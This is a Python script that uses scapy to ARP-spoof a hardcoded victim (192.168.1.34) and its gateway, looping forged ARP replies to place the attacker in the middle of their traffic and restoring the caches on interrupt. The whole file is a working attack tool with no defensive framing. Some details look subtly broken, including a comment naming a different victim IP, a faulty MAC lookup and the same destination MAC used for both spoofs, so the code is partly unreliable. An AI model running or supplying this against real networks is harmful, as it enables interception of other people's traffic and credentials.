import scapy.all as scapy
import time
import argparse
import sys

# targetIP: is Ip address of victim machine(10.0.2.4)
# destinationMac: is Mac address of victim machine
# spoofIP: is gatewayIP
# op=2: represents the ARP packet is a response packet


destinationMac = '14-10-9F-E1-65-61'
sourceMAC = '0C-9D-92-82-9F-26'


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[1].hwsrc


def spoofer(targetIP, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)


def restore(destinationIP, sourceIP):
    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=get_mac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(packet, count=4, verbose=False)


targetIP = '192.168.1.34'
gatewayIP = '192.168.1.1'

packets = 0
try:
    while True:
        spoofer(targetIP, gatewayIP)
        spoofer(gatewayIP, targetIP)
        print("\r[+] Sent packets " + str(packets)),
        sys.stdout.flush()
        packets += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
